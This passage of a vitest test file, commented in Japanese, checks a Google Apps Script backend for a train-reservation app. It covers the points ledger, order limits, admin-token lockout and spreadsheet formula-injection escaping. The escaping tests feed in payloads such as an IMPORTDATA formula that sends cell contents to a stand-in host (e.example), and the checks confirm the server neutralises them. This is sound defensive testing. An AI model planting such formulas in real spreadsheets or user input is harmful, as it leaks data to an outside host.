// サーバー(gas/Code.gs)のポイントの台帳を、スプレッドシートの代わりの表を使って動かして、調べる。
// Code.gs を、そのまま読み込んで、Google のサービス(シート・ロック・応答)だけを、作りものに差し替える。
import fs from 'node:fs';
import path from 'node:path';
import vm from 'node:vm';
import { beforeEach, describe, expect, it } from 'vitest';

type Row = [string, string, string, string, number, string];
// eslint-disable-next-line @typescript-eslint/no-explicit-any
type Gas = Record<string, any>;

const source = fs.readFileSync(path.resolve(__dirname, '..', 'gas', 'Code.gs'), 'utf-8');

let rows: unknown[][] = [];
let gas: Gas;

const loadGas = (): Gas => {
  rows = [['日時', '会員ID', '種別', '名札', 'ポイント', '内容']];
  const sheet = {
    getDataRange: () => ({ getValues: () => rows.map((r) => [...r]) }),
    appendRow: (r: unknown[]) => void rows.push(r),
  };
  const ctx: Gas = {
    Logger: { log: () => undefined },
    LockService: { getScriptLock: () => ({ waitLock: () => undefined, releaseLock: () => undefined }) },
    Utilities: { formatDate: () => '2026/11/02 12:00:00' },
    ContentService: {},
    // 読み込むときに、LINE の設定を読む(テストでは、空)
    PropertiesService: { getScriptProperties: () => ({ getProperty: () => '' }) },
  };
  vm.createContext(ctx);
  vm.runInContext(source, ctx);
  // Google のサービスに触る部分を、作りものに差し替える(中の計算は、本物のまま)
  ctx.createJsonResponse = (d: unknown) => d;
  ctx.getOrCreateSheetWithHeaders = () => sheet;
  ctx.authMember = (token: string) =>
    token === 'ok' ? { memberId: 'M1' } : { error: { status: 'error', code: 'session' } };
  return ctx;
};

// 台帳に、1行足す(最初の同期が済んだ状態は、'welcome' の行がある状態)
const put = (kind: string, key: string, points: number, memberId = 'M1') =>
  rows.push(['2026/11/02 12:00:00', memberId, kind, key, points, 'テスト'] as Row);

const balance = (memberId = 'M1') =>
  Math.max(0, rows.slice(1).filter((r) => r[1] === memberId).reduce((s, r) => s + (r[4] as number), 0));

beforeEach(() => {
  gas = loadGas();
});

describe('ポイントを使う(spendPoints)', () => {
  it('残高から引いて、台帳に「使った」行を足す', () => {
    put('welcome', 'welcome', 1000);
    const r = gas.handleSpendPoints('ok', 'EQ-1', 300, 'お支払い');
    expect(r).toMatchObject({ status: 'success', spent: 300, balance: 700, added: true });
    expect(rows[rows.length - 1].slice(1, 5)).toEqual(['M1', 'spend', 'use:EQ-1', -300]);
  });

  it('同じ予約番号は、1回だけ。通信のやり直しで、二重に引かれない', () => {
    put('welcome', 'welcome', 1000);
    gas.handleSpendPoints('ok', 'EQ-1', 300, 't');
    const again = gas.handleSpendPoints('ok', 'EQ-1', 300, 't');
    expect(again).toMatchObject({ status: 'success', added: false, balance: 700 });
    expect(balance()).toBe(700);
  });

  it('予約番号が違えば、別々に引く(デリバリーの分など)', () => {
    put('welcome', 'welcome', 1000);
    gas.handleSpendPoints('ok', 'EQ-1', 300, 't');
    const r = gas.handleSpendPoints('ok', 'EQ-1-Dabc', 200, 't');
    expect(r).toMatchObject({ status: 'success', balance: 500 });
  });

  it('残高が足りなければ、引かない', () => {
    put('welcome', 'welcome', 100);
    const r = gas.handleSpendPoints('ok', 'EQ-1', 101, 't');
    expect(r).toMatchObject({ status: 'error', insufficient: true, balance: 100 });
    expect(balance()).toBe(100);
    expect(rows.length).toBe(2);
  });

  it('残高ちょうどまでは使える(残り0)', () => {
    put('welcome', 'welcome', 100);
    expect(gas.handleSpendPoints('ok', 'EQ-1', 100, 't')).toMatchObject({ status: 'success', balance: 0 });
  });

  it('おかしな指定は、断る(0・マイナス・数でない・予約番号の文字)', () => {
    put('welcome', 'welcome', 1000);
    [0, -5, NaN, 'abc', undefined].forEach((p) => expect(gas.handleSpendPoints('ok', 'EQ-1', p, 't').status).toBe('error'));
    ['', 'a b', 'EQ_1', 'x'.repeat(41), '<script>'].forEach((id) =>
      expect(gas.handleSpendPoints('ok', id, 10, 't').status, `予約番号 ${id}`).toBe('error')
    );
    expect(balance()).toBe(1000);
  });

  it('ログインの有効期限が切れていれば、断る', () => {
    put('welcome', 'welcome', 1000);
    expect(gas.handleSpendPoints('bad', 'EQ-1', 10, 't')).toMatchObject({ status: 'error', code: 'session' });
    expect(balance()).toBe(1000);
  });

  it('最初の同期(端末のポイントの引き継ぎ)の前は、引かない', () => {
    const r = gas.handleSpendPoints('ok', 'EQ-1', 10, 't');
    expect(r.status).toBe('error');
    expect(rows.length).toBe(1);
  });

  it('ほかの会員の残高は、使えない', () => {
    put('welcome', 'welcome', 1000, 'M2');
    put('welcome', 'welcome', 50, 'M1');
    expect(gas.handleSpendPoints('ok', 'EQ-1', 100, 't')).toMatchObject({ status: 'error', insufficient: true });
    expect(balance('M2')).toBe(1000);
  });
});

describe('予約で付くポイント(3%・最低50pt)', () => {
  it('新しい予約: 合計の3%。最低50pt', () => {
    put('welcome', 'welcome', 0);
    gas.awardReservationPoints('M1', 'EQ-1', 3000, null, '特急あやみ 1号');
    expect(rows[rows.length - 1].slice(2, 5)).toEqual(['reservation', 'reservation:EQ-1', 90]);
    gas.awardReservationPoints('M1', 'EQ-2', 1000, null, '特急あやみ 2号');
    expect(rows[rows.length - 1].slice(3, 5)).toEqual(['reservation:EQ-2', 50]);
  });

  it('ぜんぶポイントで払った(合計0円)ときは、付かない', () => {
    put('welcome', 'welcome', 0);
    gas.awardReservationPoints('M1', 'EQ-1', 0, null, 't');
    expect(rows.length).toBe(2);
  });

  it('同じ予約の再送では、二重に付かない', () => {
    put('welcome', 'welcome', 0);
    gas.awardReservationPoints('M1', 'EQ-1', 3000, null, 't');
    gas.awardReservationPoints('M1', 'EQ-1', 3000, null, 't');
    expect(rows.length).toBe(3);
  });

  it('デリバリーを足したときは、増えた金額の分だけ付く。金額が変わらなければ、付かない', () => {
    put('welcome', 'welcome', 0);
    gas.awardReservationPoints('M1', 'EQ-1', 3000, null, 't');
    gas.awardReservationPoints('M1', 'EQ-1', 5000, 3000, 't');
    expect(rows[rows.length - 1].slice(2, 5)).toEqual(['delivery', 'delivery:EQ-1:1', 60]);
    const n = rows.length;
    gas.awardReservationPoints('M1', 'EQ-1', 5000, 5000, 't');
    expect(rows.length).toBe(n);
  });

  it('最初の同期の前は、付かない', () => {
    gas.awardReservationPoints('M1', 'EQ-1', 3000, null, 't');
    expect(rows.length).toBe(1);
  });
});

describe('デリバリーを足したときのポイント(増えた金額の3%。最低50ptは、なし)', () => {
  const added = (previous: number, next: number) => {
    gas.awardReservationPoints('M1', 'EQ-1', next, previous, 't');
    return rows[rows.length - 1];
  };

  it('少額の追加は、3%だけ(450円で13pt)。最低50ptには、ならない', () => {
    put('welcome', 'welcome', 0);
    gas.awardReservationPoints('M1', 'EQ-1', 900, null, 't'); // 新しい予約は、最低50pt
    expect(rows[rows.length - 1].slice(3, 5)).toEqual(['reservation:EQ-1', 50]);
    expect(added(900, 1350).slice(2, 5)).toEqual(['delivery', 'delivery:EQ-1:1', 13]);
  });

  it('1,000円は30pt、1,667円は50pt、3,000円は90pt', () => {
    put('welcome', 'welcome', 0);
    expect(added(1000, 2000)[4]).toBe(30);
    expect(added(2000, 3667)[4]).toBe(50);
    expect(added(3667, 6667)[4]).toBe(90);
  });

  it('3%が0ptになる少額(33円)は、行を作らない', () => {
    put('welcome', 'welcome', 0);
    const n = rows.length;
    gas.awardReservationPoints('M1', 'EQ-1', 1033, 1000, 't');
    expect(rows.length).toBe(n);
  });

  it('金額が減った・変わらないときは、付かない(ポイントで払った追加も)', () => {
    put('welcome', 'welcome', 0);
    const n = rows.length;
    gas.awardReservationPoints('M1', 'EQ-1', 2000, 2000, 't');
    gas.awardReservationPoints('M1', 'EQ-1', 1500, 2000, 't');
    expect(rows.length).toBe(n);
  });

  it('少額を何度足しても、最低分は集められない', () => {
    put('welcome', 'welcome', 0);
    let total = 1000;
    for (let i = 0; i < 5; i++) {
      gas.awardReservationPoints('M1', 'EQ-1', total + 450, total, 't');
      total += 450;
    }
    expect(balance()).toBe(13 * 5);
  });

  it('追加を重ねたあとの取り消しで、予約分も追加分も、全部消える', () => {
    put('welcome', 'welcome', 100);
    gas.awardReservationPoints('M1', 'EQ-1', 900, null, 't'); // 50
    gas.awardReservationPoints('M1', 'EQ-1', 1350, 900, 't'); // 13
    gas.awardReservationPoints('M1', 'EQ-1', 2350, 1350, 't'); // 30
    expect(balance()).toBe(100 + 50 + 13 + 30);
    gas.revokeReservationPoints('M1', 'EQ-1');
    expect(balance()).toBe(100);
  });
});

describe('予約を取り消したとき', () => {
  it('付いたポイントは取り消す。使ったポイントは、戻らない', () => {
    put('welcome', 'welcome', 1000);
    gas.handleSpendPoints('ok', 'EQ-1', 500, 't');
    gas.awardReservationPoints('M1', 'EQ-1', 1810, null, 't'); // 54pt
    expect(balance()).toBe(1000 - 500 + 54);
    gas.revokeReservationPoints('M1', 'EQ-1');
    expect(balance()).toBe(1000 - 500); // 付いた54ptだけ消える。使った500ptは戻らない
  });

  it('取り消しを2回しても、二重に引かれない', () => {
    put('welcome', 'welcome', 1000);
    gas.awardReservationPoints('M1', 'EQ-1', 1810, null, 't');
    gas.revokeReservationPoints('M1', 'EQ-1');
    gas.revokeReservationPoints('M1', 'EQ-1');
    expect(balance()).toBe(1000);
  });
});

// ---- シートに書く文字: 式として動かされない ----
// 「=」「+」「-」「@」で始まる文字は、シートが式として動かす。利用者・LINE から来る文字は、先頭に ' を付けて書く。
describe('シートに書く文字(式の注入を防ぐ)', () => {
  const evil = '=IMPORTDATA("https://e.example/"&F2)';

  it('先頭が = + - @ タブ 改行 のときだけ、先頭に \' を付ける', () => {
    ['=1+1', '+1', '-1', '@a', '\tx', '\rx'].forEach((v) => expect(gas.sheetSafe(v), v).toBe("'" + v));
    ['abc', '', '神埼', 'a=b', ' =1', '1', 'EQ-1'].forEach((v) => expect(gas.sheetSafe(v), v).toBe(v));
    expect(gas.sheetSafe(5)).toBe(5);
    expect(gas.sheetSafe(-5)).toBe(-5);
  });

  it('ポイント台帳: タイトルが式でも、式にならずに書かれる(数のポイントは、そのまま)', () => {
    put('welcome', 'welcome', 1000);
    gas.handleSpendPoints('ok', 'EQ-1', 300, evil);
    const last = rows[rows.length - 1];
    expect(last[5]).toBe("'" + evil);
    expect(last[4]).toBe(-300);
  });

  const sheetsFor = (written: unknown[][]) => ({
    getSheetByName: () => null,
    insertSheet: () => ({
      appendRow: (r: unknown[]) => void written.push(r),
      getRange: () => ({ setBackground: () => ({ setFontColor: () => ({ setFontWeight: () => undefined }) }) }),
      setFrozenRows: () => undefined,
    }),
  });

  it('クーポン発行ログ: LINE の userId が式でも、式にならずに書かれる', () => {
    const written: unknown[][] = [];
    gas.getDataSpreadsheet = () => sheetsFor(written);
    gas.logCouponIssue(evil, { courseId: 'c', courseName: 'n', reward: 'r' });
    const row = written.find((r) => r[2] === 'c');
    expect(row?.[1]).toBe("'" + evil);
  });

  it('会員の登録: 表示名・メールが式でも、式にならずに書かれる', () => {
    const written: unknown[][] = [];
    const store: Record<string, string> = {};
    const emailEvil = '=importdata("https://e.example/"&f2&"@a.b")';
    gas.CacheService = {
      getScriptCache: () => ({
        get: (k: string) => store[k] ?? null,
        put: (k: string, v: string) => void (store[k] = v),
        remove: (k: string) => void delete store[k],
      }),
    };
    store['line_otp_ABC234'] = JSON.stringify({ code: '123456', lineUserId: evil });
    gas.findMemberByEmail = () => null;
    gas.getOrCreateMembersSheet = () => ({
      getDataRange: () => ({ getValues: () => [['会員ID']] }),
      appendRow: (r: unknown[]) => void written.push(r),
    });
    gas.Utilities = { ...gas.Utilities, getUuid: () => 'salt' };
    gas.hashPassword = () => 'hash';
    gas.createSessionToken = () => 'tok';
    const nameEvil = '=HYPERLINK("x")'; // 表示名は30文字まで
    const r = gas.handleVerifyLineAndRegister(emailEvil, 'Abcd1!', 'ABC234', '123456', nameEvil);
    expect(r.status).toBe('success');
    const row = written[0];
    expect(row[1]).toBe("'" + emailEvil);
    expect(row[3]).toBe("'" + nameEvil);
    expect(row[8]).toBe("'" + evil);
    expect(r.user.name).toBe(nameEvil); // 画面へ返す名前は、元のまま
  });

  it('予約: 列車名・座席などが式でも、式にならずに書かれる(日付と時刻の列は、文字の書式のまま)', () => {
    const written: unknown[][] = [];
    const cells: Record<string, unknown[]> = {};
    const headers = ['予約日時', '予約番号', 'LINE_USER_ID', '列車名', '号車', '座席番号', '席種', '乗車駅', '降車駅', '合計金額', 'ステータス', '会員ID', '予約日', '出発時刻', '到着時刻'];
    gas.verifySessionToken = () => 'M1';
    gas.findMemberById = () => ({ memberId: 'M1', lineUserId: evil });
    gas.getOrCreateReservationsSheet = () => ({
      getDataRange: () => ({ getValues: () => [headers, ...written] }),
      appendRow: (r: unknown[]) => void written.push(r),
      getLastRow: () => written.length + 1,
      getRange: (row: number, col: number) => ({
        setNumberFormat: () => undefined,
        setValue: (v: unknown) => void (cells[`${row},${col}`] = [v]),
        setValues: () => undefined,
      }),
    });
    const r = gas.handleCreateReservation('t', {
      orderId: 'EQ-100', trainName: evil, seatNo: '=A1', seatType: '+x', boardingStation: '@b', destinationStation: '-d',
      totalPrice: 1000, reservedDate: '2026-11-02', departureTime: '10:00', arrivalTime: '11:00',
    }, false);
    expect(r.status).toBe('success');
    const row = written[0] as string[];
    expect(row[headers.indexOf('列車名')]).toBe("'" + evil);
    expect(row[headers.indexOf('座席番号')]).toBe("'=A1");
    expect(row[headers.indexOf('LINE_USER_ID')]).toBe("'" + evil);
    expect(row[headers.indexOf('乗車駅')]).toBe("'@b");
    expect(row[headers.indexOf('降車駅')]).toBe("'-d");
    // 文字の書式の列に、あとから ' が残らないよう、日付・時刻は元の値を書き直す
    expect(cells[`2,${headers.indexOf('予約日') + 1}`]).toEqual(['2026-11-02']);
  });
});

// ---- ポイントの台帳: 申告の金額・くり返しで、水増しできない ----
// ポイントの決まり(3%・最低50pt)は変えない。くり返し・巨額の申告・取消のあとの出し直しで、増やせないことを調べる。
describe('ポイントの水増しを防ぐ(予約の登録・取消)', () => {
  const HEADERS = ['予約日時', '予約番号', 'LINE_USER_ID', '列車名', '号車', '座席番号', '席種', '乗車駅', '降車駅', '合計金額', 'ステータス', '会員ID', '予約日', '出発時刻', '到着時刻'];
  let grid: unknown[][];

  const setupReservations = () => {
    grid = [[...HEADERS]];
    const sheet = {
      getDataRange: () => ({ getValues: () => grid.map((r) => [...r]) }),
      appendRow: (r: unknown[]) => void grid.push([...r]),
      getLastRow: () => grid.length,
      getLastColumn: () => grid[0].length,
      getRange: (row: number, col: number, nr = 1, nc = 1) => ({
        getValues: () => [grid[row - 1].slice(col - 1, col - 1 + nc)],
        setValue: (v: unknown) => void (grid[row - 1][col - 1] = v),
        setValues: (vs: unknown[][]) => vs.forEach((r, i) => r.forEach((v, j) => void (grid[row - 1 + i][col - 1 + j] = v))),
        setNumberFormat: () => undefined,
      }),
    };
    gas.verifySessionToken = () => 'M1';
    gas.findMemberById = () => ({ memberId: 'M1', lineUserId: '' });
    gas.getOrCreateReservationsSheet = () => sheet;
    gas.getDataSpreadsheet = () => ({ getSheetByName: () => sheet });
  };

  const order = (orderId: string, totalPrice: number) => ({
    orderId, trainName: '特急あやみ 1号', carNo: 1, seatNo: '1A', seatType: '指定席', boardingStation: '東京', destinationStation: '大宮',
    totalPrice, reservedDate: '2099-01-01', departureTime: '10:00', arrivalTime: '11:00', items: [], itemDiscount: 0,
  });
  const create = (id: string, total: number, award = true) => gas.handleCreateReservation('t', order(id, total), award);

  beforeEach(() => {
    setupReservations();
    put('welcome', 'welcome', 0);
  });

  it('金額を下げて、また上げても、同じ分のポイントは、二度付かない', () => {
    create('EQ-1', 20000); // 600pt
    expect(balance()).toBe(600);
    create('EQ-1', 100); // 下げる
    create('EQ-1', 20000); // 上げ直す(いままでの最高と同じ)
    expect(balance()).toBe(600);
    create('EQ-1', 30000); // 最高を超えた分(10000円の3%)だけ付く
    expect(balance()).toBe(900);
  });

  it('金額を1円ずつ上げ下げしても、ポイントは増えない', () => {
    create('EQ-1', 1000); // 最低50pt
    for (let i = 0; i < 6; i++) {
      create('EQ-1', 1001 + i);
      create('EQ-1', 1000);
    }
    expect(balance()).toBe(50);
  });

  it('巨額の申告は、予約ごと断る(予約台帳にも、ポイントにも、触れない)', () => {
    expect(create('EQ-1', 1000000)).toMatchObject({ status: 'error', code: 'order_limit' });
    expect(grid.length).toBe(1);
    expect(rows.length).toBe(2);
  });

  it('1日に予約で付くポイントは、3000ptまで(予約をくり返しても、それ以上は付かない)', () => {
    for (let i = 0; i < 5; i++) create(`EQ-${i + 1}`, 50000); // 1回1500pt
    expect(balance()).toBe(3000);
  });

  it('日が変われば、また付く', () => {
    for (let i = 0; i < 3; i++) create(`EQ-${i + 1}`, 50000);
    expect(balance()).toBe(3000);
    rows.forEach((r, i) => i > 0 && (r[0] = '2026/11/01 12:00:00')); // きのうの分にする
    create('EQ-9', 50000);
    expect(balance()).toBe(4500);
  });

  it('取り消した予約は、同じ予約番号で出し直せない(取消のあとの出し直しで、ポイントを残せない)', () => {
    create('EQ-1', 1000);
    gas.handleCancelReservation('t', 'EQ-1', true);
    expect(balance()).toBe(0);
    for (let i = 0; i < 3; i++) {
      expect(create('EQ-1', 2000 + i)).toMatchObject({ status: 'error' });
      gas.handleCancelReservation('t', 'EQ-1', true);
    }
    expect(balance()).toBe(0);
  });

  it('公開前のアプリ(ポイントに触れない呼び出し)は、これまでどおり出し直せて、予約の数も縛られない', () => {
    create('EQ-1', 1000, false);
    gas.handleCancelReservation('t', 'EQ-1', false);
    expect(create('EQ-1', 1000, false)).toMatchObject({ status: 'success' });
    for (let i = 0; i < 25; i++) expect(create(`EQ-X${i}`, 1000, false).status).toBe('success');
    expect(rows.length).toBe(2); // 台帳には触れない
  });

  it('まだ乗っていない予約は、1会員20件まで。取り消すか乗車後なら、また取れる', () => {
    for (let i = 0; i < 20; i++) expect(create(`EQ-${100 + i}`, 1000).status).toBe('success');
    expect(create('EQ-999', 1000)).toMatchObject({ status: 'error' });
    expect(create('EQ-100', 1500).status).toBe('success'); // 持っている予約の更新は、数えない
    gas.handleCancelReservation('t', 'EQ-101', true);
    expect(create('EQ-999', 1000).status).toBe('success');
  });
});

// ---- 管理トークン: 管理者画面を開く前の確認と、失敗の回数制限 ----
describe('管理トークン(verifyAdminToken・setDisruptions)', () => {
  const KEY = 'correct-horse-battery';
  let cache: Record<string, string>;
  let props: Record<string, string>;
  let lockFails: boolean;
  let saved: unknown[];

  beforeEach(() => {
    cache = {};
    props = { ADMIN_TOKEN: KEY };
    lockFails = false;
    saved = [];
    gas.CacheService = {
      getScriptCache: () => ({
        get: (k: string) => cache[k] ?? null,
        put: (k: string, v: string) => void (cache[k] = v),
        remove: (k: string) => void delete cache[k],
      }),
    };
    gas.LockService = {
      getScriptLock: () => ({
        waitLock: () => {
          if (lockFails) throw new Error('busy');
        },
        releaseLock: () => undefined,
      }),
    };
    gas.PropertiesService = {
      getScriptProperties: () => ({
        getProperty: (k: string) => props[k] ?? '',
        setProperty: (k: string, v: string) => void ((props[k] = v), saved.push(k)),
      }),
    };
  });

  it('正しい管理トークンは通る', () => {
    expect(gas.handleVerifyAdminToken(KEY)).toEqual({ status: 'success' });
  });

  it('違うトークン・空・文字でないものは、断る(code: admin)', () => {
    [KEY + 'x', KEY.slice(0, -1), '', 'x'.repeat(5000), undefined, null, 123, [KEY], { a: 1 }].forEach((t) => {
      cache = {};
      expect(gas.handleVerifyAdminToken(t), String(t)).toMatchObject({ status: 'error', code: 'admin' });
    });
  });

  it('サーバーにトークンが設定されていなければ、空のトークンでも通さない', () => {
    props = {};
    expect(gas.handleVerifyAdminToken('')).toMatchObject({ status: 'error', code: 'admin' });
    expect(gas.handleVerifyAdminToken(undefined)).toMatchObject({ status: 'error', code: 'admin' });
  });

  it('5回続けて失敗すると、正しいトークンでも、しばらく断る(code: admin_locked)', () => {
    for (let i = 0; i < 5; i++) expect(gas.handleVerifyAdminToken('bad' + i)).toMatchObject({ code: 'admin' });
    expect(gas.handleVerifyAdminToken(KEY)).toMatchObject({ status: 'error', code: 'admin_locked' });
  });

  it('4回失敗して、5回目に成功すれば、回数は消える', () => {
    for (let i = 0; i < 4; i++) gas.handleVerifyAdminToken('bad' + i);
    expect(gas.handleVerifyAdminToken(KEY)).toEqual({ status: 'success' });
    for (let i = 0; i < 4; i++) expect(gas.handleVerifyAdminToken('bad' + i)).toMatchObject({ code: 'admin' });
    expect(gas.handleVerifyAdminToken(KEY)).toEqual({ status: 'success' });
  });

  it('同じ時刻に送られても、数え漏れない(数えるところは、ロックの中。ロックを取れなければ通さない)', () => {
    lockFails = true;
    expect(gas.handleVerifyAdminToken(KEY)).toMatchObject({ status: 'error', code: 'admin_busy' });
    expect(gas.handleSetDisruptions({ a: 1 }, [], KEY)).toMatchObject({ status: 'error', code: 'admin_busy' });
    expect(saved).toEqual([]);
  });

  it('ロックを待っているあいだに、ほかの失敗で上限に届いたら、ロックの中で確かめ直して断る', () => {
    let reads = 0;
    gas.CacheService = {
      getScriptCache: () => ({
        get: () => (++reads === 1 ? '4' : '5'), // 1回目(ロックの前)は4回、ロックの中では、もう5回
        put: () => undefined,
        remove: () => undefined,
      }),
    };
    expect(gas.handleVerifyAdminToken(KEY)).toMatchObject({ status: 'error', code: 'admin_locked' });
  });

  it('止めているあいだは、ロックを待たずに断る(連打でロックを塞がせない)', () => {
    cache['admin_token_fail'] = '5';
    lockFails = true; // ロックを取ろうとすれば、busy になるはず
    expect(gas.handleVerifyAdminToken(KEY)).toMatchObject({ code: 'admin_locked' });
  });

  it('運行情報の保存(setDisruptions)も、同じ回数制限を使う', () => {
    for (let i = 0; i < 3; i++) gas.handleVerifyAdminToken('bad' + i);
    for (let i = 0; i < 2; i++) expect(gas.handleSetDisruptions({ a: 1 }, [], 'bad')).toMatchObject({ code: 'admin' });
    expect(gas.handleSetDisruptions({ a: 1 }, [], KEY)).toMatchObject({ status: 'error', code: 'admin_locked' });
    expect(saved).toEqual([]);
  });

  it('正しいトークンなら、運行情報を保存できる(これまでどおり)', () => {
    expect(gas.handleSetDisruptions({ kanzaki: { statusType: 'delay' } }, [], KEY)).toEqual({ status: 'success' });
    expect(saved).toEqual(['OPERATION_DISRUPTIONS']);
  });

  it('doPost の verifyAdminToken は、トークンだけを確かめる(何も書き換えない)', () => {
    gas.ContentService = {};
    const out = gas.doPost({ postData: { contents: JSON.stringify({ action: 'verifyAdminToken', adminToken: KEY }) } });
    expect(out).toEqual({ status: 'success' });
    expect(saved).toEqual([]);
  });
});

// ---- 1回の注文の上限(合計10万円・1商品9個・合計20個・座席6席) ----
describe('注文の上限(予約の登録・デリバリーの追加)', () => {
  const HEADERS = ['予約日時', '予約番号', 'LINE_USER_ID', '列車名', '号車', '座席番号', '席種', '乗車駅', '降車駅', '合計金額', 'ステータス', '会員ID', '予約日', '出発時刻', '到着時刻'];
  let grid: unknown[][];

  beforeEach(() => {
    grid = [[...HEADERS]];
    const sheet = {
      getDataRange: () => ({ getValues: () => grid.map((r) => [...r]) }),
      appendRow: (r: unknown[]) => void grid.push([...r]),
      getLastRow: () => grid.length,
      getLastColumn: () => grid[0].length,
      getRange: (row: number, col: number, _rows = 1, cols = 1) => ({
        getValues: () => [grid[row - 1].slice(col - 1, col - 1 + cols)],
        setValue: (v: unknown) => void (grid[row - 1][col - 1] = v),
        setValues: (vs: unknown[][]) => vs.forEach((r, i) => r.forEach((v, j) => void (grid[row - 1 + i][col - 1 + j] = v))),
        setNumberFormat: () => undefined,
      }),
    };
    gas.verifySessionToken = () => 'M1';
    gas.findMemberById = () => ({ memberId: 'M1', lineUserId: '' });
    gas.getOrCreateReservationsSheet = () => sheet;
    put('welcome', 'welcome', 0);
  });

  const base = { trainName: '特急あやみ 1号', carNo: 1, seatNo: '1A', seatType: '指定席', boardingStation: '東京', destinationStation: '大宮', reservedDate: '2099-01-01', departureTime: '10:00', arrivalTime: '11:00' };
  const send = (o: Record<string, unknown>, award = true) => gas.handleCreateReservation('t', { orderId: 'EQ-1', ...base, ...o }, award);
  const item = (quantity: number, price = 800, name = '駅弁') => ({ name, quantity, price });
  const refused = (r: { status: string; code?: string }) => expect(r).toMatchObject({ status: 'error', code: 'order_limit' });

  it('ふつうの注文(特急券と、駅弁数個)は、通る', () => {
    expect(send({ totalPrice: 2400 + 2 * 800 + 500, items: [item(2), item(1, 500, 'お茶')], itemDiscount: 0, pointsUsed: 0 }).status).toBe('success');
    expect(grid.length).toBe(2);
  });

  it('合計10万円までは通り、1円でも超えたら、断る(N-POINTで払った分も含めて数える)', () => {
    expect(send({ totalPrice: 100000, items: [] }).status).toBe('success');
    refused(send({ orderId: 'EQ-2', totalPrice: 100001, items: [] }));
    expect(send({ orderId: 'EQ-3', totalPrice: 60000, pointsUsed: 40000, items: [] }).status).toBe('success');
    refused(send({ orderId: 'EQ-4', totalPrice: 60000, pointsUsed: 40001, items: [] }));
  });

  it('1商品は9個まで。10個は断る', () => {
    expect(send({ totalPrice: 7200, items: [item(9)] }).status).toBe('success');
    refused(send({ orderId: 'EQ-2', totalPrice: 8000, items: [item(10)] }));
  });

  it('1注文は合わせて20個まで。21個は断る', () => {
    const ok = [item(9, 100, 'a'), item(9, 100, 'b'), item(2, 100, 'c')];
    expect(send({ totalPrice: 2000, items: ok }).status).toBe('success');
    refused(send({ orderId: 'EQ-2', totalPrice: 2100, items: [item(9, 100, 'a'), item(9, 100, 'b'), item(3, 100, 'c')] }));
  });

  it('おかしな数(マイナス・小数・数でない・巨大)は、断る', () => {
    [-1, 1.5, 'abc', NaN, Infinity, 11101].forEach((q, i) => refused(send({ orderId: `EQ-${i + 10}`, totalPrice: 1000, items: [item(q as number)] })));
    [-5, 'x', Infinity].forEach((t, i) => refused(send({ orderId: `EQ-${i + 30}`, totalPrice: t as number, items: [] })));
    refused(send({ orderId: 'EQ-40', totalPrice: 1000, pointsUsed: -1, items: [] }));
    refused(send({ orderId: 'EQ-41', totalPrice: 1000, itemDiscount: 99999999, items: [] }));
    refused(send({ orderId: 'EQ-42', totalPrice: 1000, items: [item(1, 31637850)] }));
    expect(grid.length).toBe(1);
  });

  it('断った注文は、予約台帳にも、ポイント台帳にも、触れない', () => {
    refused(send({ totalPrice: 31637850, items: [item(11101, 2850)] }));
    expect(grid.length).toBe(1);
    expect(rows.length).toBe(2);
  });

  it('デリバリーを足す(同じ予約番号の更新)ときも、上限で断る。前の内容は、そのまま残る', () => {
    expect(send({ totalPrice: 3000, items: [] }).status).toBe('success');
    refused(send({ totalPrice: 31637850, items: [item(11101, 2850)] }));
    expect(grid[1][HEADERS.indexOf('合計金額')]).toBe(3000);
    expect(balance()).toBe(90);
  });

  it('公開前のアプリの呼び出し(明細なし・ポイントなし)にも、合計金額の上限が効く', () => {
    expect(send({ totalPrice: 4000 }, false).status).toBe('success');
    refused(send({ orderId: 'EQ-2', totalPrice: 31637850 }, false));
  });

  it('N-POINTを使う額も、1回10万円まで', () => {
    put('welcome', 'welcome2', 300000);
    expect(gas.handleSpendPoints('ok', 'EQ-1', 100000, 't')).toMatchObject({ status: 'success' });
    expect(gas.handleSpendPoints('ok', 'EQ-2', 100001, 't')).toMatchObject({ status: 'error' });
  });

  describe('複数席(最大6席)', () => {
    const seatCell = () => grid[1][HEADERS.indexOf('座席番号')];

    it('1席は、今までどおり保存される', () => {
      expect(send({ seatNo: '4B', totalPrice: 2400, items: [] }).status).toBe('success');
      expect(seatCell()).toBe('4B');
    });

    it('2〜6席は通り、座席番号は切れずにそのまま台帳に入る', () => {
      expect(send({ seatNo: '4B,4C', totalPrice: 4800, items: [] }).status).toBe('success');
      expect(seatCell()).toBe('4B,4C');
      const six = '10A,10B,10C,10D,9A,9B';
      expect(send({ orderId: 'EQ-2', seatNo: six, totalPrice: 14400, items: [] }).status).toBe('success');
      expect(grid[2][HEADERS.indexOf('座席番号')]).toBe(six);
    });

    it('7席は断る。台帳にもポイントにも触れない', () => {
      refused(send({ seatNo: '1A,1B,1C,1D,2A,2B,2C', totalPrice: 16800, items: [] }));
      expect(grid.length).toBe(1);
      expect(rows.length).toBe(2);
    });

    it('同じ席の重複・座席の形でない文字(複数席のとき)・空の席は、扱いが決まっている', () => {
      expect(send({ seatNo: '4B,4B', totalPrice: 4800, items: [] })).toMatchObject({ status: 'error' });
      expect(send({ seatNo: '4B,=A1', totalPrice: 4800, items: [] })).toMatchObject({ status: 'error' });
      expect(send({ seatNo: '4B;1A=x,4C', totalPrice: 4800, items: [] })).toMatchObject({ status: 'error' });
      expect(grid.length).toBe(1);
      // 空の席は数えず、台帳には詰めて書く
      expect(send({ orderId: 'EQ-2', seatNo: '4B,,4C,', totalPrice: 4800, items: [] }).status).toBe('success');
      expect(grid[1][HEADERS.indexOf('座席番号')]).toBe('4B,4C');
    });

    it('自由席は、1人(自由席)も、人数つき(自由席×3)も通る。7人は断る', () => {
      expect(send({ seatNo: '自由席', totalPrice: 750, items: [] }).status).toBe('success');
      expect(send({ orderId: 'EQ-2', seatNo: '自由席×3', totalPrice: 2250, items: [] }).status).toBe('success');
      expect(grid[2][HEADERS.indexOf('座席番号')]).toBe('自由席×3');
      refused(send({ orderId: 'EQ-3', seatNo: '自由席×7', totalPrice: 5250, items: [] }));
      expect(send({ orderId: 'EQ-4', seatNo: '自由席×0', totalPrice: 0, items: [] })).toMatchObject({ status: 'error' });
    });

    it('座席番号が1席でも、複数席でも、更新(デリバリーを足す)は通る', () => {
      expect(send({ seatNo: '1A,1B', totalPrice: 4800, items: [] }).status).toBe('success');
      expect(send({ seatNo: '1A,1B', totalPrice: 5600, items: [item(1)] }).status).toBe('success');
      expect(grid.length).toBe(2);
    });

    it('複数席の予約のポイントは、合計の3%を1回だけ(席の数でかけ算しない)', () => {
      expect(send({ seatNo: '1A,1B,1C', totalPrice: 7200, items: [] }).status).toBe('success');
